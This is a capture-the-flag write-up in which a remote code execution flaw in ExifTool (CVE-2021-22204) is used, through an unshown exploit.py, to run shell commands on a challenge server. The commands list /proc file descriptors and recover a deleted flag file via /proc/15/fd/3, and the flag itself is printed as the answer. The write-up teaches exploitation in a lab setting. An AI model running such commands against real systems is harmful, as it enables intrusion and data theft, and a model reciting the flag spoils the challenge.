## **Challenge Name: Reverse Metadata Part 2**

### **Description**

This server processes uploaded images and reads their metadata every few minutes. But… something feels off. Our analysts suspect a hidden vulnerability in how the metadata is handled. Can you investigate the system and uncover the flaw?

(Q2) The second flag seems to be hidden... Tip: Where do deleted files go in Linux?

**Challenge author**: _itzamn

**Challenge URL**: `http://18.212.136.134:9090/`

---

### **Approach**

1. **Initial Investigation**  
   - This is a follow-up to Reverse Metadata Part 1
   - The same ExifTool RCE vulnerability (CVE-2021-22204) is used
   - The tip asks about where deleted files go in Linux

2. **Understanding Deleted Files in Linux**  
   - In Linux, deleted files can still be accessed if:
     - They are open file descriptors in `/proc/PID/fd/`
     - They are in the trash directory: `~/.local/share/Trash/files/`
   - The tip suggests checking these locations

3. **Checking Trash Directory**  
   - Attempted to list the trash directory:
     ```bash
     python3 exploit.py -c "ls -la ~/.local/share/Trash/files/ > /var/www/html/res.txt"
     ```
   - The trash directory was empty or not accessible

4. **Checking Process File Descriptors**  
   - Listed all processes and their file descriptors:
     ```bash
     python3 exploit.py -c "ls -laR /proc/*/fd/ > /var/www/html/fd_list.txt"
     ```
   - Found a deleted file reference in process file descriptors:
     ```
     /proc/15/fd:
     total 0
     dr-x------ 2 root root  4 Nov 23 07:05 .
     dr-xr-xr-x 9 root root  0 Nov 23 07:00 ..
     lr-x------ 1 root root 64 Nov 23 07:05 0 -> /dev/null
     l-wx------ 1 root root 64 Nov 23 07:05 1 -> pipe:[44826069]
     l-wx------ 1 root root 64 Nov 23 07:05 2 -> pipe:[44826070]
     l-wx------ 1 root root 64 Nov 23 07:05 3 -> /tmp/flag.txt (deleted)
     ```
   - Found a deleted file at `/tmp/flag.txt` accessible through `/proc/15/fd/3`

5. **Reading the Deleted File**  
   - Read the deleted file through the file descriptor:
     ```bash
     python3 exploit.py -c "cat /proc/15/fd/3 > /var/www/html/recovered_flag.txt"
     ```
   - Successfully recovered the flag from the deleted file

---

### **Flag**

```
PCTF{hidden_in_depths}
```

---

